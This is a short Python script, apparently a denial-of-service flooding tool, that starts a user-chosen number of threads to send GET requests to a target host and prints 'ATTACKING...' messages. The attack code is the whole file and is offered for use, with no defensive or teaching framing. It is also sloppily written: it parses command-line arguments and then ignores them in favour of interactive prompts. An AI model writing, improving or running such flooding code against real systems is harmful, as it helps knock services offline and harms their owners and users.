#!/usr/bin/env python
# -*- encoding: utf-8 -*-
import argparse, urllib.request, time
from threading import Thread

host, threads = [None , 0]

def main():
	parser = argparse.ArgumentParser(description='Attack the target with GET requests')
	parser.add_argument('host', help='The target host')
	parser.add_argument('threads', type=int, help='Number of attack threads')
	parsed = parser.parse_args()
	host = input('Host: ')
	threads = int(input('Number of Threads: '))
	try:
		attack(host, threads)
	except:
		print('Cannot create a new thread...')

def connect(host):
	try:
		response = urllib.request.urlopen('http://%s' % (host)).read()
	except:
		print('Cannot connect to %s...' % host)

def attack(host, threads):
	print('\nATTACKING...\n')
	for i in range(threads):
		t = Thread(target=connect, args=(host,))
		print('Thread #%d: Attacking...' % i)
		t.start()
	
if __name__ == '__main__':
	main()